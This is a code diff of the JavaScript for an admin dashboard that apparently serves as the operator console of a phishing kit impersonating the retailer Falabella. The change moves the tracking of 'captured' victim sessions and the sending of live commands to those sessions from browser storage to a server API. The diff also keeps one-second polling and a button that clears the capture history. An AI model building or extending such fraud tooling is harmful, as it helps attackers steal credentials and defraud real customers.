@@ -6,38 +6,33 @@ document.addEventListener("DOMContentLoaded", () => {
   const statLastTime = document.querySelector("#stat-last-time");
   const statLastDoc = document.querySelector("#stat-last-doc");
 
-  function getSessions() {
+  async function fetchSessions() {
     try {
-      return JSON.parse(localStorage.getItem("falabella_sessions")) || [];
-    } catch {
-      return [];
+      const res = await fetch("/api/sessions");
+      if (res.ok) {
+        return await res.json();
+      }
+    } catch (e) {
+      console.error("Error fetching sessions:", e);
+    }
+    return [];
+  }
+
+  async function sendCommand(sessionId, command) {
+    try {
+      await fetch("/api/command", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ sessionId, action: command })
+      });
+      await renderFeed();
+    } catch (e) {
+      console.error("Error sending command:", e);
     }
   }
 
-  function saveSessions(sessions) {
-    localStorage.setItem("falabella_sessions", JSON.stringify(sessions));
-  }
-
-  function sendCommand(sessionId, command) {
-    const actionObj = {
-      id: sessionId,
-      action: command,
-      timestamp: Date.now()
-    };
-    localStorage.setItem("falabella_active_action", JSON.stringify(actionObj));
-    
-    // Update session status in storage
-    const sessions = getSessions();
-    const target = sessions.find(s => s.id === sessionId);
-    if (target) {
-      target.status = command;
-      saveSessions(sessions);
-    }
-    renderFeed();
-  }
-
-  function renderFeed() {
-    const sessions = getSessions();
+  async function renderFeed() {
+    const sessions = await fetchSessions();
     
     // Stats update
     statTotal.textContent = sessions.length;
@@ -144,7 +139,6 @@ document.addEventListener("DOMContentLoaded", () => {
       container.appendChild(card);
     });
 
-    // Attach event listeners to command buttons
     document.querySelectorAll(".adm-cmd-btn").forEach(btn => {
       btn.addEventListener("click", () => {
         const id = btn.dataset.id;
@@ -154,20 +148,15 @@ document.addEventListener("DOMContentLoaded", () => {
     });
   }
 
-  // Clear all button
-  document.querySelector("#btn-clear-all").addEventListener("click", () => {
+  document.querySelector("#btn-clear-all").addEventListener("click", async () => {
     if (confirm("¿Estás seguro de borrar todo el historial de capturas?")) {
-      localStorage.removeItem("falabella_sessions");
-      localStorage.removeItem("falabella_active_action");
-      renderFeed();
+      await fetch("/api/sessions", { method: "DELETE" });
+      await renderFeed();
     }
   });
 
   document.querySelector("#btn-refresh").addEventListener("click", renderFeed);
 
-  // Poll for changes every second
   setInterval(renderFeed, 1000);
-  window.addEventListener("storage", renderFeed);
-
   renderFeed();
 });
